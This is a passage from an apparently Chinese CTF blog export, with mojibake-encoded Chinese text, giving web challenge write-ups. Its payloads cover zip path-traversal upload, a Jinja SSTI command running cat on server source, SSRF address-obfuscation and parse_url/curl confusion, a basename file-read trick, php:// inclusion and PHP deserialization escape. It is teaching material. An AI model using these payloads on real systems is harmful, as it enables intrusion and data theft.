method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; &gt; &lt;h1&gt;æ–‡ä»¶ä¸Šä¼ ç« èŠ‚ç»ƒä¹ é¢˜&lt;/h1&gt; &lt;hr /&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label class=&quot;col-sm-2 control-label&quot;&gt;é€‰æ‹©æ–‡ä»¶ï¼š&lt;/label&gt; &lt;div class=&quot;input-group col-sm-10&quot;&gt; &lt;div &gt; &lt;label for=&quot;&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;/label&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;col-sm-8 text-right&quot;&gt; &lt;input type=&quot;submit&quot; class=&quot;btn btn-success text-right btn1&quot; /&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&#x27;; show_source(__FILE__);&#125;else&#123; $file = $_FILES[&#x27;file&#x27;]; if(!$file)&#123; exit(&quot;è¯·å‹¿ä¸Šä¼ ç©ºæ–‡ä»¶&quot;); &#125; $name = $file[&#x27;name&#x27;]; $dir = &#x27;upload/&#x27;; $ext = strtolower(substr(strrchr($name, &#x27;.&#x27;), 1)); $path = $dir.$name; function check_dir($dir)&#123; $handle = opendir($dir); while(($f = readdir($handle)) !== false)&#123; if(!in_array($f, array(&#x27;.&#x27;, &#x27;..&#x27;)))&#123; if(is_dir($dir.$f))&#123; check_dir($dir.$f.&#x27;/&#x27;); &#125;else&#123; $ext = strtolower(substr(strrchr($f, &#x27;.&#x27;), 1)); if(!in_array($ext, array(&#x27;jpg&#x27;, &#x27;gif&#x27;, &#x27;png&#x27;)))&#123; unlink($dir.$f); &#125; &#125; &#125; &#125; &#125; if(!is_dir($dir))&#123; mkdir($dir); &#125; $temp_dir = $dir.md5(time(). rand(1000,9999)); if(!is_dir($temp_dir))&#123; mkdir($temp_dir); &#125; if(in_array($ext, array(&#x27;zip&#x27;, &#x27;jpg&#x27;, &#x27;gif&#x27;, &#x27;png&#x27;)))&#123; if($ext == &#x27;zip&#x27;)&#123; $archive = new PclZip($file[&#x27;tmp_name&#x27;]); foreach($archive-&gt;listContent() as $value)&#123; $filename = $value[&quot;filename&quot;]; if(preg_match(&#x27;/\\.php$/&#x27;, $filename))&#123; exit(&quot;å‹ç¼©åŒ…å†…ä¸å…è®¸å«æœ‰phpæ–‡ä»¶!&quot;); &#125; &#125; if ($archive-&gt;extract(PCLZIP_OPT_PATH, $temp_dir, PCLZIP_OPT_REPLACE_NEWER) == 0) &#123; check_dir($dir); exit(&quot;è§£å‹å¤±è´¥&quot;); &#125; check_dir($dir); exit(&#x27;ä¸Šä¼ æˆåŠŸ!&#x27;); &#125;else&#123; move_uploaded_file($file[&#x27;tmp_name&#x27;], $temp_dir.&#x27;/&#x27;.$file[&#x27;name&#x27;]); check_dir($dir); exit(&#x27;ä¸Šä¼ æˆåŠŸ!&#x27;); &#125; &#125;else&#123; exit(&#x27;ä»…å…è®¸ä¸Šä¼ zipã€jpgã€gifã€pngæ–‡ä»¶!&#x27;); &#125;&#125; æ ¸å¿ƒçš„ç‚¹åœ¨check_dirè¿™é‡Œï¼Œæˆ‘ä»¬ä¸Šä¸‹çœ‹ä¸€çœ¼å°±çŸ¥é“æˆ‘ä»¬æ˜¯ç™½åå•ä¸Šä¼ ï¼Œç»•è¿‡å°±åˆ«æƒ³äº†ï¼Œä½†æ˜¯ä»–å…è®¸æˆ‘ä»¬ä¸Šä¼ zipï¼Œè¿™æ ·çš„è¯å°±æœ‰æ“ä½œçš„ç©ºé—´äº†ã€‚æ³¨æ„è¿™ä¸ªå‡½æ•°ï¼š 1$archive = new PclZip($file[&#x27;tmp_name&#x27;]); è¿™é‡Œæ¶‰åŠåˆ°äº†ä¸€ä¸ªtrickï¼Œè¯¥å‡½æ•°æ˜¯å­˜åœ¨ç›®å½•ç©¿è¶Šæ¼æ´çš„ï¼ã€‚ä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬çš„æ–‡ä»¶åä¸º../../xx.php.xx å°±ä¼šè¢«ä¸Šä¼ åˆ°å…¶ä»–ç›®å½•ï¼Œè¿™é‡Œä¿®æ”¹çš„è¯éœ€è¦åˆ©ç”¨010editoræ¥è¿›è¡Œæ“ä½œ ä¹‹åæˆ‘ä»¬å¯ä»¥çœ‹è§ï¼š 123456foreach($archive-&gt;listContent() as $value)&#123; $filename = $value[&quot;filename&quot;]; if(preg_match(&#x27;/\\.php$/&#x27;, $filename))&#123; exit(&quot;å‹ç¼©åŒ…å†…ä¸å…è®¸å«æœ‰phpæ–‡ä»¶!&quot;); &#125; &#125; é€»è¾‘æ˜¯å…ˆè§£å‹æ–‡ä»¶ï¼Œä¹‹åå†checkï¼Œä½†æ˜¯åˆ©ç”¨è¯¥æ¼æ´ï¼Œcheckçš„æ—¶å€™æ–‡ä»¶å·²ç»è¢«åˆ›å»ºåˆ°å…¶ä»–æ–‡ä»¶å¤¹å»äº†ï¼Œä¹Ÿå°±æ²¡åŠæ³•checkåˆ°äº†ã€‚ æ‰€ä»¥æˆ‘ä»¬è¿™é‡Œç›´æ¥ä¸Šä¼ ä¸€ä¸ª../../xx.php.xxxå°±è¡Œäº† [ç¬¬ä¸‰ç«  webè¿›é˜¶]SSTIç®€å•é¢˜ç›®ï¼Œç›´æ¥æ¢­å°±è¡Œäº† 1http:&#x2F;&#x2F;5d5ec153-1957-45a2-bff1-fda588f70774.node3.buuoj.cn&#x2F;?password&#x3D;&#123;&#123; config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat app&#x2F;server.py&#39;).read() &#125;&#125; [ç¬¬ä¸‰ç«  webè¿›é˜¶]Pythoné‡Œçš„SSRFçŸ¥è¯†ç‚¹ï¼š å…³äºSSRFï¼Œå…¶å®æˆ‘ä¹Ÿæ‡‚å¾—ä¸å¤š..è¿™é“é¢˜é¢˜ç›®ç»™å‡ºæç¤ºè®©æˆ‘ä»¬è®¿é—® 8000 ç«¯å£å’Œ url path /api/internal/secret è¿™é‡Œæ˜¯çœ‹è¿‡Pç‰›çš„æ–‡ç« .. 1leavesongs.com&#x2F;PYTHON&#x2F;defend-ssrf-vulnerable-in-python.html æ‰€ä»¥æˆ‘ä»¬æƒ³è¦ç»•è¿‡åªéœ€è¦æ„é€ ï¼š 1http:&#x2F;&#x2F;95cf0d10-668e-49cc-a0ac-3982c091dd6d.node3.buuoj.cn&#x2F;?url&#x3D;http:&#x2F;&#x2F;127.233.233.233:8000&#x2F;api&#x2F;internal&#x2F;secret é™¤æ­¤ä¹‹å¤–ï¼Œåœ¨linuxå½“ä¸­0.0.0.0ç­‰æ•ˆäº127.0.0.1 æ•…æˆ‘ä»¬å…¶å®ä¹Ÿå¯ä»¥æ„é€ ï¼š 1http:&#x2F;&#x2F;95cf0d10-668e-49cc-a0ac-3982c091dd6d.node3.buuoj.cn&#x2F;?url&#x3D;http:&#x2F;&#x2F;0.0.0.0:8000&#x2F;api&#x2F;internal&#x2F;secret è¿˜æœ‰ï¼š åˆ©ç”¨å…«è¿›åˆ¶IPåœ°å€ç»•è¿‡ åˆ©ç”¨åå…­è¿›åˆ¶IPåœ°å€ç»•è¿‡ åˆ©ç”¨åè¿›åˆ¶çš„IPåœ°å€ç»•è¿‡ åˆ©ç”¨IPåœ°å€çš„çœç•¥å†™æ³•ç»•è¿‡ 1å››ç§å†™æ³•ï¼ˆ5ä¸ªä¾‹å­ï¼‰ï¼š012.0.0.1 ã€ 0xa.0.0.1 ã€ 167772161 ã€ 10.1 ã€ 0xA000001 å®é™…ä¸Šéƒ½è¯·æ±‚çš„æ˜¯10.0.0.1ï¼Œä½†ä»–ä»¬ä¸€ä¸ªéƒ½åŒ¹é…ä¸ä¸Šä¸Šè¿°æ­£åˆ™è¡¨è¾¾å¼ã€‚ è¿™é‡Œè¿˜æä¾›ä¸€äº›ssrfçš„æ€è·¯ï¼Œæ¯”å¦‚ï¼š 1http://233.233.233.233@10.0.0.1:8080/ã€http://10.0.0.1#233.233.233.233è¿™æ ·çš„URLï¼Œè®©åç«¯è®¤ä¸ºå…¶Hostæ˜¯233.233.233.233ï¼Œå®é™…ä¸Šè¯·æ±‚çš„å´æ˜¯10.0.0.1ã€‚è¿™ç§æ–¹æ³•åˆ©ç”¨çš„æ˜¯ç¨‹åºå‘˜å¯¹URLè§£æçš„é”™è¯¯ è¿˜æœ‰è¿™ä¹ˆä¸€ä¸ª[xipæœåŠ¡] http://xip.io æš‚ä¸”æ€è€ƒåˆ°è¿™é‡Œï¼š [ç¬¬äºŒç«  webè¿›é˜¶]SSRF Trainingå‘ƒï¼Œå°±å¾ˆå¥‡æ€ªï¼Ÿè¿™é“é¢˜çš„æ—¶å€™ï¼Œindex.phpæœåŠ¡ä¸‹çš„å®¹å™¨ï¼Œå¯ä»¥ç›´æ¥127.0.0.1/flag.phpå°±å†²è¿‡å»äº† ä½†æ˜¯è¿˜æœ‰ä¸ªchallenge.php,è¿™ä¸ªè¦éš¾ã€‚ç»™å‡ºæºç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?phphighlight_file(__FILE__);function check_inner_ip($url)&#123; $match_result=preg_match(&#x27;/^(http|https)?:\\/\\/.*(\\/)?.*$/&#x27;,$url); if (!$match_result) &#123; die(&#x27;url fomat error&#x27;); &#125; try &#123; $url_parse=parse_url($url); &#125; catch(Exception $e) &#123; die(&#x27;url fomat error&#x27;); return false; &#125; $hostname=$url_parse[&#x27;host&#x27;]; $ip=gethostbyname($hostname); $int_ip=ip2long($ip); return ip2long(&#x27;127.0.0.0&#x27;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#x27;10.0.0.0&#x27;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#x27;172.16.0.0&#x27;)&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long(&#x27;192.168.0.0&#x27;)&gt;&gt;16 == $int_ip&gt;&gt;16;&#125;function safe_request_url($url)&#123; if (check_inner_ip($url)) &#123; echo $url.&#x27; is inner ip&#x27;; &#125; else &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); $output = curl_exec($ch); $result_info = curl_getinfo($ch); if ($result_info[&#x27;redirect_url&#x27;]) &#123; safe_request_url($result_info[&#x27;redirect_url&#x27;]); &#125; curl_close($ch); var_dump($output); &#125;&#125;$url = $_GET[&#x27;url&#x27;];if(!empty($url))&#123; safe_request_url($url);&#125;?&gt; ä¸»è¦trickåœ¨äºparse_urlå’Œcurlçš„è§£æä¼šå‡ºç°å·®å¼‚ï¼Œå½“æˆ‘ä»¬æ„é€ urlä¸ºï¼š 1http:&#x2F;&#x2F;a@127.0.0.1:80@baidu.com parse_urlä¼šè§£æåè€…ï¼Œæ‹¿åˆ°æ‰‹ä¸Šçš„å°±æ˜¯http://baidu.com,è€Œcurlå®é™…ä¸Šå‘é€å‡ºå»çš„è¯·æ±‚ä¸º127.0.0.1:80 æ³¨æ„ä¸€äº›ï¼Œå¦‚æœä½ éœ€è¦è®¿é—®æŸä¸ªé¡µé¢ï¼Œä½ éœ€è¦æ·»åŠ çš„payloadåº”è¯¥æ˜¯ï¼š 1?url=http://a@127.0.0.1:80@hacktest.com/flag.php","categories":[],"tags":[]},{"title":"RoacCTFOnlineProxy","slug":"RoacCTFOnlineProxy","date":"2020-11-26T03:12:30.000Z","updated":"2020-11-26T07:57:01.936Z","comments":true,"path":"2020/11/26/RoacCTFOnlineProxy/","link":"","permalink":"http://example.com/2020/11/26/RoacCTFOnlineProxy/","excerpt":"","text":"","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"}]},{"title":"Zer0pts2020","slug":"Zer0pts2020","date":"2020-11-24T04:36:59.000Z","updated":"2020-12-02T08:19:04.672Z","comments":true,"path":"2020/11/24/Zer0pts2020/","link":"","permalink":"http://example.com/2020/11/24/Zer0pts2020/","excerpt":"","text":"Can you guess it?ä¸€å¼€å§‹æ”¾æºç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpinclude &#x27;config.php&#x27;; // FLAG is defined in config.phpif (preg_match(&#x27;/config\\.php\\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123; exit(&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;);&#125;if (isset($_GET[&#x27;source&#x27;])) &#123; highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;])); exit();&#125;$secret = bin2hex(random_bytes(64));if (isset($_POST[&#x27;guess&#x27;])) &#123; $guess = (string) $_POST[&#x27;guess&#x27;]; if (hash_equals($secret, $guess)) &#123; $message = &#x27;Congratulations! The flag is: &#x27; . FLAG; &#125; else &#123; $message = &#x27;Wrong.&#x27;; &#125;&#125;?&gt;&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;Can you guess it?&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Can you guess it?&lt;/h1&gt; &lt;p&gt;If your guess is correct, I&#x27;ll give you the flag.&lt;/p&gt; &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt; &lt;hr&gt;&lt;?php if (isset($message)) &#123; ?&gt; &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;&lt;?php &#125; ?&gt; &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt; &lt;input type=&quot;submit&quot;&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; è™½ç„¶è¿™é‡Œçš„çŒœæµ‹æˆåŠŸä¹‹åä½ å¯ä»¥æ‹¿åˆ°flagï¼Œä½†æ˜¯å¾ˆæ˜æ˜¾è¿™é‡Œçš„å‡½æ•°å¹¶æ²¡æœ‰æ¼æ´ï¼Œç”¨çš„å‡½æ•°æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œé‚£ä¹ˆå°±è½¬æ¢æ€è·¯çœ‹ä¸Šé¢çš„ highlight_fileï¼Œå› ä¸ºè¿™é‡Œçš„å‚æ•°æˆ‘ä»¬ä¹Ÿå¯ä»¥æ§åˆ¶ï¼Œä»‹ç»ä¸€ä¸‹ 1$_SERVER[&#x27;PHP_SELF&#x27;] è¯¥å‚æ•°ä¼šè¿”å›æˆ‘ä»¬çš„URLçš„è·¯å¾„ï¼Œå¦‚å›¾æ‰€ç¤ºï¼š æˆ‘ä»¬å†ç”¨basenameå¥—ä¸Šå» è¿™æ ·å°±å¯ä»¥æ‹¿åˆ°æœ€åä¸€éƒ¨åˆ†äº†ï¼Œä½†æ˜¯basenameæœ‰ä¸€ä¸ªé—®é¢˜ï¼š å®˜ç½‘æ˜¯æœ‰æç¤ºçš„ï¼Œæˆ‘ä»¬éœ€è¦å•ç‹¬çš„setloaleæ¥è¿›è¡Œæ“ä½œï¼Œå› ä¸ºasciiä¸­æœ‰è¿™ä¹ˆä¸€æ®µä»‹ç»ï¼š 123åœ¨è‹±è¯­ä¸­ï¼Œç”¨128ä¸ªç¬¦å·ç¼–ç ä¾¿å¯ä»¥è¡¨ç¤ºæ‰€æœ‰ï¼Œä½†æ˜¯ç”¨æ¥è¡¨ç¤ºå…¶ä»–è¯­è¨€ï¼Œ128ä¸ªç¬¦å·æ˜¯ä¸å¤Ÿçš„ã€‚æ¯”å¦‚ï¼Œåœ¨æ³•è¯­ä¸­ï¼Œå­—æ¯ä¸Šæ–¹æœ‰æ³¨éŸ³ç¬¦å·ï¼Œå®ƒå°±æ— æ³•ç”¨ ASCII ç è¡¨ç¤ºã€‚äºæ˜¯ï¼Œä¸€äº›æ¬§æ´²å›½å®¶å°±å†³å®šï¼Œåˆ©ç”¨å­—èŠ‚ä¸­é—²ç½®çš„æœ€é«˜ä½ç¼–å…¥æ–°çš„ç¬¦å·ã€‚æ¯”å¦‚ï¼Œæ³•è¯­ä¸­çš„Ã©çš„ç¼–ç ä¸º130ï¼ˆäºŒè¿›åˆ¶10000010ï¼‰ã€‚è¿™æ ·ä¸€æ¥ï¼Œè¿™äº›æ¬§æ´²å›½å®¶ä½¿ç”¨çš„ç¼–ç ä½“ç³»ï¼Œå¯ä»¥è¡¨ç¤ºæœ€å¤š256ä¸ªç¬¦å· [5] ã€‚ä½†æ˜¯ï¼Œè¿™é‡Œåˆå‡ºç°äº†æ–°çš„é—®é¢˜ã€‚ä¸åŒçš„å›½å®¶æœ‰ä¸åŒçš„å­—æ¯ï¼Œå› æ­¤ï¼Œå“ªæ€•å®ƒä»¬éƒ½ä½¿ç”¨256ä¸ªç¬¦å·çš„ç¼–ç æ–¹å¼ï¼Œä»£è¡¨çš„å­—æ¯å´ä¸ä¸€æ ·ã€‚æ¯”å¦‚ï¼Œ130åœ¨æ³•è¯­ç¼–ç ä¸­ä»£è¡¨äº†Ã©ï¼Œåœ¨å¸Œä¼¯æ¥è¯­ç¼–ç ä¸­å´ä»£è¡¨äº†å­—æ¯Gimel (×’)ï¼Œåœ¨ä¿„è¯­ç¼–ç ä¸­åˆä¼šä»£è¡¨å¦ä¸€ä¸ªç¬¦å·ã€‚ä½†æ˜¯ä¸ç®¡æ€æ ·ï¼Œæ‰€æœ‰è¿™äº›ç¼–ç æ–¹å¼ä¸­ï¼Œ0--127è¡¨ç¤ºçš„ç¬¦å·æ˜¯ä¸€æ ·çš„ï¼Œä¸ä¸€æ ·çš„åªæ˜¯128--255çš„è¿™ä¸€æ®µ [5] ã€‚è‡³äºäºšæ´²å›½å®¶çš„æ–‡å­—ï¼Œä½¿ç”¨çš„ç¬¦å·å°±æ›´å¤šäº†ï¼Œæ±‰å­—å°±å¤šè¾¾10ä¸‡å·¦å³ã€‚ä¸€ä¸ªå­—èŠ‚åªèƒ½è¡¨ç¤º256ç§ç¬¦å·ï¼Œè‚¯å®šæ˜¯ä¸å¤Ÿçš„ï¼Œå°±å¿…é¡»ä½¿ç”¨å¤šä¸ªå­—èŠ‚è¡¨è¾¾ä¸€ä¸ªç¬¦å·ã€‚æ¯”å¦‚ï¼Œç®€ä½“ä¸­æ–‡å¸¸è§çš„ç¼–ç æ–¹å¼æ˜¯ GB2312ï¼Œä½¿ç”¨ä¸¤ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªæ±‰å­—ï¼Œæ‰€ä»¥ç†è®ºä¸Šæœ€å¤šå¯ä»¥è¡¨ç¤º 256 x 256 = 65536 ä¸ªç¬¦å· [5] ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€æ—¦æˆ‘ä»¬çš„asciiä½æ•°å¤§äº128ï¼Œå°±ä¼šå‡ºç°æ­§ä¹‰çš„æƒ…å†µï¼Œè€Œæ±‰å­—é»˜è®¤ä½¿ç”¨çš„æ˜¯GBKç¼–ç ï¼Œå¦‚æœæˆ‘ä»¬è¾“å‡ºçš„æ•°å¤§äº128ï¼Œbasenameå› ä¸ºæ— æ³•æ­£ç¡®çš„è§£æï¼Œå°±ä¼šå¿½ç•¥è¿™ ä¸€æ®µï¼Œå‘å‰æŸ¥æ‰¾ã€‚ é‚£æˆ‘ä»¬çš„æ€è·¯å°±å¾ˆæ¸…æ¥šäº† 1http:&#x2F;&#x2F;3a053ba1-1ae6-4030-8c67-3cacb6336ad7.node3.buuoj.cn&#x2F;index.php&#x2F;config.php&#x2F;%81?source å¾—åˆ°flag phpNantokaAdminMusicBlogè¿™é‡Œä¸»è¦æ˜¯ç”¨åˆ°äº†ä¸€ä¸ªtrickï¼Œå…³äºHTMLçš„ä¸€ä¸ªç»†èŠ‚ã€‚å½“HTMLå‡ºç°&lt;a/xxx&gt;çš„æƒ…å†µä¸‹ï¼Œåˆ™ä¼šé»˜è®¤åªè§£æå‰åŠéƒ¨åˆ†ï¼Œè€Œä¸ä¼šè§£æåé¢çš„partï¼Œå…·ä½“ä¾‹å­å¦‚ä¸‹ï¼š 1234567891011&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;åŸºç¡€æŸ±çŠ¶å›¾&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;a &gt; 123123123123&lt;/a&gt; &lt;a/bcde&gt;123&lt;/a&gt; &lt;/body&gt; &lt;/html&gt; ä½†åœ¨è§£æç§ï¼Œä¾ç„¶ä¼šå°†åè€…è§£æå˜æˆaæ ‡ç­¾ã€‚ å›åˆ°é¢˜ç›®æ¥è¯´ï¼Œåªéœ€è¦æˆ‘ä»¬é€šè¿‡è¯¥ç‰¹è´¨+hrefå³å¯å®Œæˆè·¨åŸŸç»•è¿‡ è¯¦ç»†æ–‡ç« ï¼š 123https:&#x2F;&#x2F;guokeya.github.io&#x2F;post&#x2F;rFsNvBC3x&#x2F;https:&#x2F;&#x2F;bugs.php.net&#x2F;bug.php?id&#x3D;78814","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"}]},{"title":"ZJCTF,å°±è¿™ï¼Ÿ","slug":"ZJCTF-å°±è¿™ï¼Ÿ","date":"2020-11-20T13:58:31.000Z","updated":"2020-11-20T14:00:59.717Z","comments":true,"path":"2020/11/20/ZJCTF-å°±è¿™ï¼Ÿ/","link":"","permalink":"http://example.com/2020/11/20/ZJCTF-%E5%B0%B1%E8%BF%99%EF%BC%9F/","excerpt":"","text":"ç»å…¸çš„ä»£ç å®¡è®¡ï¼ 123456789101112131415161718&lt;?phperror_reporting(0);$text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;I have a dream&quot;))&#123; echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; die(&quot;Not now!&quot;); &#125; include($file); //next.php &#125;else&#123; highlight_file(__FILE__);&#125;?&gt; è¿™é‡Œæ³¨æ„ç¬¬ä¸€æ­¥ï¼Œéœ€è¦æˆ‘ä»¬è¯»å–åˆ°çš„æ–‡ä»¶çš„å†…å®¹å½“ä¸­å«æœ‰I have a dreamï¼Œç„¶è€Œæ–‡ä»¶å½“ä¸­å‹æ ¹æ²¡æœ‰è¿™ä¸ªå†…å®¹ï¼Œäºæ˜¯è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿæœ‰ä¸¤ä¸ªåŠæ³•ï¼Œç¬¬ä¸€ä¸ªæ˜¯åˆ©ç”¨php://input,data://ä¼ªåè®® å¦‚æœä½ ä½¿ç”¨php://input,é‚£ä¹ˆphpå°±ä¼šå»è¯»å–bodyå½“ä¸­çš„å†…å®¹ï¼Œä½ åªéœ€è¦åœ¨è¿™æ„é€ I have a dreamå³å¯ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜æœ‰çš„å°±æ˜¯åˆ©ç”¨data://ä¼ªåè®®ï¼Œ è¿˜æœ‰è¿œç¨‹æ–‡ä»¶åŒ…å«","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"}]},{"title":"ååºåˆ—åŒ–é€ƒé€¸","slug":"ååºåˆ—åŒ–é€ƒé€¸","date":"2020-11-20T12:02:23.000Z","updated":"2020-12-10T02:44:45.789Z","comments":true,"path":"2020/11/20/ååºåˆ—åŒ–é€ƒé€¸/","link":"","permalink":"http://example.com/2020/11/20/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/","excerpt":"","text":"ä¹Ÿç®—æ˜¯å¤šåšåšæ€»ç»“å§ å˜é•¿ä»ç½‘ä¸Šçœ‹æ¥çš„é‚£ä¹ˆä¸€æ®µä»£ç ï¼š 12345678910111213141516&lt;?phpfunction filter($str)&#123; return str_replace(&#x27;bb&#x27;, &#x27;ccc&#x27;, $str);&#125;class A&#123; public $name=&#x27;aaaa&#x27;; public $pass=&#x27;123456&#x27;;&#125;$AA=new A();$res=filter(serialize($AA));echo $res;echo &quot;&lt;br&gt;&quot;;$c=unserialize($res);echo $c-&gt;pass;?&gt; æˆ‘ä»¬éœ€è¦åšåˆ°çš„æ˜¯ï¼Œå¦‚ä½•ä¿®æ”¹$passçš„å€¼ï¼Ÿ é¦–å…ˆå½“æˆ‘ä»¬åºåˆ—åŒ–ä¸€æ®µAçš„çš„è¯å¾—åˆ°çš„ç»“æœå¦‚ä¸‹ï¼š 1O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;aaaa&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125; å¹¶ä¸”æˆ‘ä»¬æ³¨æ„åˆ°å®ƒä¼šæŠŠbbå˜æˆcccï¼Œå½“ä»–åºåˆ—åŒ–çš„æ—¶å€™ï¼Œå·²ç»å®Œæˆäº†ï¼Œä½†æ˜¯ç»è¿‡è¿‡æ»¤ä¹‹åå®ƒçš„å­—ç¬¦ä¸²ä¼šå˜é•¿ï¼Œç»å†çš„æ˜¯è¿™ä¹ˆä¸€ä¸ªè¿‡ç¨‹: åŒæ—¶ï¼Œååºåˆ—åŒ–è¿˜æœ‰è¿™ä¹ˆä¸€ä¸ªç‰¹ç‚¹ï¼Œä¸€æ—¦è¯»å–åˆ°&#125;ï¼Œä»–å°±ä¼šåœæ­¢ï¼Œä¸ä¼šå†è¯»å–åé¢çš„å†…å®¹ï¼Œè¿™æ ·çš„è¯å°±å¾ˆå¥½è§£é‡Šäº†ï¼Œæˆ‘ä»¬æ„é€ payloadå¦‚ä¸‹ï¼š æˆåŠŸä¿®æ”¹äº†ç»“æœï¼ é‚£ä¹ˆå¦‚æœæ˜¯å˜çŸ­çš„æƒ…å†µä¸‹å‘¢ï¼Ÿ é•¿çŸ­çš„åŒºåˆ«ï¼šå’Œå‰é¢å˜é•¿çš„åŸç†æ˜¯ä¸ä¸€æ ·çš„ï¼Œåœ¨ååºåˆ—åŒ–é€ƒé€¸å˜é•¿çš„æƒ…å†µä¸‹ï¼Œä½ éœ€è¦åšçš„æ˜¯æ‹¼æ¥è‡ªå·±åé¢éœ€è¦å†™çš„ä¸œè¥¿ï¼Œæ‰€ä»¥ä½ æ‰€éœ€è¦è¡¥å……çš„é•¿åº¦=ä½ payloadçš„é•¿åº¦ï¼Œå¹¶ä¸”ä½ æ˜¯å†™åˆ°æœ«å°¾å‡ºç°&#125; ä¸ºæ­¢ï¼Œä»¥æ­¤æ¥ä½¿å¾—åé¢çš„å­—ç¬¦ä¸²ä¸§å¤±ä½œç”¨ï¼ï¼ï¼ï¼ï¼ï¼ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœæ˜¯å˜çŸ­çš„å­—ç¬¦ä¸²é€ƒé€¸ï¼Œä½ éœ€è¦èƒ½å¤Ÿæ§åˆ¶ä¸¤ä¸ªå˜é‡ï¼ å˜çŸ­ï¼šè€Œå˜çŸ­åˆ™æˆªç„¶ä¸åŒï¼Œå¦‚æœä½ éœ€è¦å˜çŸ­ï¼Œä½ è¦åšçš„æ˜¯åƒæ‰ä½ æƒ³è¦ä¿®æ”¹çš„éƒ¨åˆ†çš„å‰é¢çš„partçš„å…¨éƒ¨ æˆ‘ä»¬ä¸€æ ·çš„å…ˆçœ‹æ­£å¸¸çš„æƒ…å†µä¸‹æ˜¯å¦‚ä½•è¿›è¡Œåºåˆ—åŒ–çš„ 1O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:9:&quot;dasasdasd&quot;;s:4:&quot;pass&quot;;s:5:&quot;asdas&quot;;&#125; å¦‚æœæˆ‘ä»¬æƒ³è¦æ“ä½œpasså¯†ç éƒ¨åˆ†ï¼ˆæ§åˆ¶åé¢çš„18æ˜¯ä¸ºäº†æ§åˆ¶é•¿åº¦ï¼‰çš„è¯ï¼Œæˆ‘ä»¬è¦åƒæ‰çš„æ˜¯ 1&quot;;s:4:&quot;pass&quot;;s:18:&quot; é‚£å°±å¾ˆç®€å•äº†ï¼Œæˆ‘ä»¬ç®—ä¸€ç®—è¿™æ®µçš„é•¿åº¦å°±å¥½äº†ï¼ï¼ï¼ï¼ï¼ç®—å‡ºæ¥æ˜¯19ï¼Œé‚£æˆ‘ä»¬å†™38ä¸ªbï¼Œæ‹¼å‡ºæ¥å‰©ä½™19ä¸ªï¼Œä¹‹åå‘¢ï¼Œæˆ‘ä»¬å»å¤å†™å‰é¢çš„é‚£ä¸€æ®µçš„å†…å®¹å°±å¥½äº†ï¼ 12345O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:38:&quot;ccccccccccccccccccc&quot;;s:4:&quot;pass&quot;;s:0:&quot;&quot;;&#125;æ¯”å¦‚æ˜¯è¿™æ ·å“ˆï¼Œæˆ‘ä»¬å¦‚æœå†™19ä¸ªbbï¼Œè¿‡æ»¤ä¹‹åå‰©ä¸‹è¿™äº›ï¼Œè¿™æ ·çš„è¯åˆ°passå‰é¢çš„éƒ¨åˆ†éƒ½æ— 